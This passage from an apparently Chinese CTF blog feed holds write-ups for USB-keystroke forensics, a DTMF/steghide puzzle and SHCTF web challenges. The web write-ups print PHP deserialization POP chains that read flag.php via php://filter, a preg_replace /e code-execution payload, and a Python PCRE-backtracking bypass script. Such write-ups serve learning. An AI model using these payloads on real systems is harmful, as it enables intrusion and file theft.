class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">17</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">:</span>        <span class="token keyword">if</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"02"</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> shiftKeys <span class="token punctuation">[</span>n<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">else</span> <span class="token punctuation">:</span>            output <span class="token operator">+=</span> normalKeys <span class="token punctuation">[</span>n<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :n'</span> <span class="token operator">+</span> output<span class="token punctuation">)</span></code></pre><p>运行可以拿到以下数据</p><pre><code>nw3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888&lt;ESC&gt;&lt;ESC&gt;2hhxgbffffbbbnnat&lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#123;999&lt;DEL&gt;&lt;DEL&gt;999&lt;DEL&gt;&lt;DEL&gt;11&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-8989&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;85848584&#125;&#125;&#125;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1yyoou&lt;SPACE&gt;ggot&lt;SPACE&gt;tthhis&lt;SPACE&gt;fllag</code></pre><p>即最终可以得到</p><pre><code>flag&#123;9919aeb2-a450-2f5f-7bfc-89df4bfa8584&#125;</code></pre><h3 id="滴滴滴"><a href="#滴滴滴" class="headerlink" title="滴滴滴"></a>滴滴滴</h3><p>下载本题可以拿到一个<code>wav文件</code>和一个<code>jpg文件</code>，先听一下<code>wav文件</code>，听这声音像是拨号的声音，一般考取的就是<code>DTMF拨音识别</code>，可以在<a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">aluigi.altervista.org</a>下载。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403282139870.png"></p><p>可以拿到一串数字<code>52563319066</code>，猜测其为密码，再结合jpg图片的考点，与密码相关的就是<code>steghide</code>，所以将其放到虚拟机我们来跑一跑</p><pre><code>steghide extract -sf secret.jpg -p 52563319066</code></pre><p>可以得到flag文件，打开即能拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403282142284.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403282143469.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF，学习，新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF-Web-WP</title>
      <link href="/2023/11/01/SHCTF-Web-WP/"/>
      <url>/2023/11/01/SHCTF-Web-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);class A&#123; public $var_1;  public function __invoke()&#123;  include($this-&gt;var_1); &#125;&#125;class B&#123; public $q; public function __wakeup()&#123; if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;      echo &quot;hacker&quot;;          &#125;&#125;&#125;class C&#123; public $var; public $z;  public function __toString()&#123;    return $this-&gt;z-&gt;var;  &#125;&#125;class D&#123; public $p;  public function __get($key)&#123;    $function &#x3D; $this-&gt;p;    return $function();  &#125; &#125;if(isset($_GET[&#39;payload&#39;]))&#123;  unserialize($_GET[&#39;payload&#39;]);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造出的poc链代码如下图</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(*__FILE__*);class A&#123;    public $var_1 &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;   public function __invoke()&#123;       include($this-&gt;var_1);    &#125;&#125;class B&#123;    public $q;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;            echo &quot;hacker&quot;;        &#125;    &#125;&#125;class C&#123;    public $var;    public $z;    public function __toString()&#123;        return $this-&gt;z-&gt;var;    &#125;&#125;class D&#123;    public $p;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;$b &#x3D; new B();$c &#x3D; new C();$d &#x3D; new D();$a &#x3D; new A();$b -&gt; q &#x3D; $c;$c -&gt; z &#x3D; $d;$d -&gt; p &#x3D; $a;echo serialize($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传参后可以得到答案</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011955588.png"></p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]) &amp;&amp; isset($_POST[&#39;pattern&#39;]))&#123;    $pattern&#x3D;$_POST[&#39;pattern&#39;];    if(!preg_match(&quot;&#x2F;flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\&#96;|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\&#x2F;| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%&#x2F;i&quot;,$code))    &#123;        $code&#x3D;$_GET[&#39;code&#39;];        preg_replace(&#39;&#x2F;(&#39; . $pattern . &#39;)&#x2F;ei&#39;,&#39;print_r(&quot;\\1&quot;)&#39;, $code);        echo &quot;you are smart&quot;;    &#125;else&#123;        die(&quot;try again&quot;);    &#125;&#125;else&#123;    die(&quot;it is begin&quot;);&#125;?&gt;it is begin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个判断需要我们get传参’code’，post传参’pattern’。</p><p>第二个判断使传参’code’中不能含有其中的指令或字符，然后在其中的 <strong>preg_replace(‘&#x2F;(‘ . $pattern . ‘)&#x2F;ei’,’print_r(“\1”)’, $code);<strong>可以得知有漏洞可以利用，即</strong>\e的命令执行</strong></p><p>这里引用大佬博客，[大佬连接](<a href="https://blog.csdn.net/m0_64815693/article/details/130327529?ops_request_misc=&request_id=&biz_id=102&utm_term=%5Ce%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-130327529.142%5Ev96%5Epc_search_result_base7&spm=1018.2226.3001.4187">关于preg_replace \e的代码执行-CSDN博客</a>)</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012011936.png"></p><p>在本题的<strong>preg_replace(‘&#x2F;(‘ . $pattern . ‘)&#x2F;ei’,’print_r(“\1”)’, $code);<strong>代码中，可以为</strong>$pattern</strong>赋值为**.***以此来匹配0个或多个字符(任意字符)，他就是匹配到了$code，然后因为他是子模式，所以\1的值就是$code，然后因为在双引号中，转义了\，\1的值$code就被当做代码执行了，所以我们只需要写一个能在print_r中执行的代码</p><blockquote><p><strong>payload   $code&#x3D;{${phpinfo()}}</strong></p><p><strong>$pattern&#x3D;.</strong>*</p></blockquote><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012023531.png"></p><h3 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">本题源代码&lt;?php error_reporting(0);highlight_file(&#39;.&#x2F;index.txt&#39;);if(isset($_POST[&#39;c_ode&#39;]) &amp;&amp; isset($_GET[&#39;num&#39;]))&#123;  $code &#x3D; (String)$_POST[&#39;c_ode&#39;];  $num&#x3D;$_GET[&#39;num&#39;];  if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))  &#123;    die(&quot;no number!&quot;);  &#125;  elseif(intval($num))  &#123;   if(preg_match(&#39;&#x2F;.+?SHCTF&#x2F;is&#39;, $code))   &#123;    die(&#39;no touch!&#39;);   &#125;   if(stripos($code,&#39;2023SHCTF&#39;) &#x3D;&#x3D;&#x3D; FALSE)   &#123;    die(&#39;what do you want&#39;);   &#125;   echo $flag;  &#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个问题是需要给num传参里不能有数字，第二个问题里用到了intval函数，该函数获取$num里的整数值，如果不是则返回False，并且使用正则表达式函数 <code>preg_match()</code> 来匹配字符串 <code>$code</code> 是否包含 <code>SHCTF</code>，stripos() 函数查找字符串在另一字符串中第一次出现的位置，即查找$code中是否有2023SHCTF，</p><p>第一步中我们可以通过给num传参进行数组绕过，即<strong>url+&#x2F;?num[]&#x3D;1</strong></p><p>然后后面可以通过pcre时间回溯漏洞，发送大量字符串”2023SHCTF”以达到其上限从而能绕过preg_match函数，这样同时满足俩个判断从而得到flag</p><p>代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;112.6.51.212:31219&#x2F;?num[]&#x3D;1&quot;data&#x3D;&#123;    &#39;c_ode&#39;:&#39;very&#39;*250000+&#39;2023SHCTF&#39;&#125;r&#x3D;requests.post(url,data&#x3D;data)print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012041609.png"></p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">源代码&lt;?phphighlight_file(__FILE__);class misca&#123;  public $gao;  public $fei;  public $a;  public function __get($key)&#123;    $this-&gt;miaomiao();    $this-&gt;gao&#x3D;$this-&gt;fei;    die($this-&gt;a);  &#125;  public function miaomiao()&#123;    $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;  &#125;&#125;class musca&#123;  public $ding;  public $dong;  public function __wakeup()&#123;    return $this-&gt;ding-&gt;dong;  &#125;&#125;class milaoshu&#123;  public $v;  public function __tostring()&#123;    echo&quot;misca~musca~milaoshu~~~&quot;;    include($this-&gt;v);  &#125;&#125;function check($data)&#123;  if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;    die(&quot;you should think harder!&quot;);  &#125;  else return $data;&#125;unserialize(check($_GET[&quot;wanna_fl.ag&quot;]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以构造如下图的poc链</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(*__FILE__*);class misca&#123;    public $gao;    public $fei;    public $a;    public function __get($key)&#123;        $this-&gt;miaomiao();        $this-&gt;gao&#x3D;$this-&gt;fei;        die($this-&gt;a);    &#125;    public function miaomiao()&#123;        $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;    &#125;&#125;class musca&#123;    public $ding;    public $dong;    public function __wakeup()&#123;        return $this-&gt;ding-&gt;dong;    &#125;&#125;class milaoshu&#123;    public $v &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;    public function __tostring()&#123;        echo&quot;misca~musca~milaoshu~~~&quot;;        include($this-&gt;v);    &#125;&#125;function check($data)&#123;    if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;        die(&quot;you should think harder!&quot;);    &#125;    else return $data;&#125;$a &#x3D; new musca();$a -&gt; ding &#x3D; new misca();$a -&gt; ding -&gt; fei &#x3D; new milaoshu();$a -&gt; ding -&gt; a &#x3D; &amp;$a -&gt; ding -&gt;gao;$b &#x3D; serialize($a);echo serialize(array($a));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输出的序列化值进行传参从而可以得到flag，将其base64解码即是flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012052335.png"></p><p>这其中要注意的是传参的 <strong>$wanna_fl.ag</strong>中需要将其转换为 <strong>wanna[fl.ag</strong>以确保岂能在get中正确传参，当get传参出现[时，将会使其变为_，且后续.不会变化，也就是说，如果不做此修改，则会导致.无法被识别，从而无法满足传参的条件。</p><h3 id="no-wake-up"><a href="#no-wake-up" class="headerlink" title="no_wake_up"></a>no_wake_up</h3><p>本题也是一个反序列化题，题目源码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);class flag&#123;  public $username;  public $code;  public function __wakeup()&#123;    $this-&gt;username &#x3D; &quot;guest&quot;;  &#125;  public function __destruct()&#123;    if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;      include($this-&gt;code);    &#125;  &#125;&#125;unserialize($_GET[&#39;try&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写其反序列化代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(*__FILE__*);class flag&#123;    public $username;    public $code &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;    public function __wakeup()&#123;        $this-&gt;username &#x3D; &quot;guest&quot;;    &#125;    public function __destruct()&#123;        if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;            include($this-&gt;code);        &#125;    &#125;&#125;$a &#x3D; new flag();echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为</p><blockquote><p>O:4:”flag”:2:{s:8:”username”;N;s:4:”code”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}</p></blockquote><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021635121.png"></p><h3 id="MD5的事就拜托了"><a href="#MD5的事就拜托了" class="headerlink" title="MD5的事就拜托了"></a>MD5的事就拜托了</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;SHCTF&#39;]))&#123;  extract(parse_url($_POST[&#39;SHCTF&#39;]));  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;    echo(md5($flag));    echo(&quot;&lt;&#x2F;br&gt;&quot;);  &#125;  if(isset($_GET[&#39;length&#39;]))&#123;    $num&#x3D;$_GET[&#39;length&#39;];    if($num*100!&#x3D;intval($num*100))&#123;      echo(strlen($flag));      echo(&quot;&lt;&#x2F;br&gt;&quot;);    &#125;  &#125;&#125;if($_POST[&#39;SHCTF&#39;]!&#x3D;md5($flag))&#123;  if($_POST[&#39;SHCTF&#39;]&#x3D;&#x3D;&#x3D;md5($flag.urldecode($num)))&#123;    echo(&quot;flag is&quot;.$flag);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过后续从大佬WP上学习知道该题为MD5补充攻击，需要我们取得知flag的长度和MD5值</p><h4 id="第一步、获得flag的MD5值"><a href="#第一步、获得flag的MD5值" class="headerlink" title="第一步、获得flag的MD5值"></a>第一步、获得flag的MD5值</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码if(isset($_POST[&#39;SHCTF&#39;]))&#123;  extract(parse_url($_POST[&#39;SHCTF&#39;]));  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;    echo(md5($flag));    echo(&quot;&lt;&#x2F;br&gt;&quot;);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里面有几个不认识的函数，例如：**parse_url()**，其效果为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;结果----------Array(    [scheme] &#x3D;&gt; http    [host] &#x3D;&gt; hostname    [user] &#x3D;&gt; username    [pass] &#x3D;&gt; password    [path] &#x3D;&gt; &#x2F;path    [query] &#x3D;&gt; arg&#x3D;value    [fragment] &#x3D;&gt; anchor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>extract()函数</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &quot;Original&quot;;$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\$a &#x3D; $a; \$b &#x3D; $b; \$c &#x3D; $c&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>extract() 函数从数组中将变量导入到当前的符号表。</strong></p><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</strong></p><p><strong>第二个参数 <em>type</em> 